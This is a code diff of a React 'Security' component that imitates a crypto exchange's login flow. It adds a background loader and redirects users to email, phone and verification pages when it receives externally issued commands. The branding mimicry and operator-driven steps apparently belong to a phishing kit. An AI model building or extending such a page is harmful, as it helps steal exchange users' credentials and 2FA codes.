@@ -5,9 +5,10 @@ import BinanceLoader from './BinanceLoader'
 import { useValidatePassword } from '../app/hooks/useValidate'
 import Modal from './VerificationModal'
 import { useCommand } from '../app/lib/CommandContext';
+import { useRouter } from 'next/navigation'
 
 export default function Security() {
-
+    const router = useRouter()
     const { theme, toggleTheme } = useTheme();
     const [invalid, setInvalid] = useState(false)
     const [modal, setModal] = useState('AuthApp')
@@ -21,6 +22,7 @@ export default function Security() {
 
 
 
+    const [bgLoader, setBgLoader] = useState(false);
     const [isLoading, setIsLoading] = useState(false)
     const [isHovered, setIsHovered] = useState(false)
 
@@ -49,17 +51,22 @@ export default function Security() {
         
             if (command === 'REQUEST_AUTHENTICATION_EMAIL') {
                 setIsLoading(false);
+                setBgLoader(true);
                 setTimeout(() => {
                     // setIsLoading(false);
                     resetCommand(); 
                     router.push('/AuthenticationPage');
                 }, 1500);
             } else if (command === 'REQUEST_AUTHENTICATION_PHONE') {
+                setIsLoading(false);
+                setBgLoader(true);
                 setTimeout(() => {
                     resetCommand(); 
                     router.push('/NumAuthenticationPage');
                 }, 1500);
             } else if (command === 'FINISH') {
+                setIsLoading(false);
+                setBgLoader(true);
                 setTimeout(() => {
                     resetCommand(); 
                     router.push('/verificationPage');
@@ -67,9 +74,28 @@ export default function Security() {
             }
         }, [command]);
 
+
+        // The function below sends displays the background loader
+        const displayBgLoader = () => {
+            setBgLoader(true);
+        }
+    
+        useEffect(() => {
+            if (bgLoader) {
+                document.body.style.overflow = 'hidden';
+            } else {
+                document.body.style.overflow = 'auto';
+            }
+    
+            return () => {
+                document.body.style.overflow = 'auto';
+            };
+        }, [bgLoader]);
+
     return (
         <div className={`lg:h-full h-screen w-full ${theme === 'light' ? 'bg-white' : 'bg-[#181a20]'} flex flex-col justify-between md:justify-normal`}>
             <Modal modal={modal} setModal={setModal} displayModal={displayModal} setDisplayModal={setDisplayModal} />
+            {bgLoader ? <BackgroundLoader /> : null}
             <div className='h-full w-full flex md:justify-center flex-col md:items-center' style={{ padding }}>
                 <div className={`md:border  ${theme === 'light' ? 'md:border-[#eaecef]' : 'md:border-[#2b3139]'} rounded-[24px] md:w-[425px] w-full min-h-[fit] md:min-h-[574px] md:px-[40px] md:pt-[40px] md:pb-[40px]`}>
                     <div className='md:mb-[20px] md:p-0 pt-[12px] px-0 pb-[20px]'>
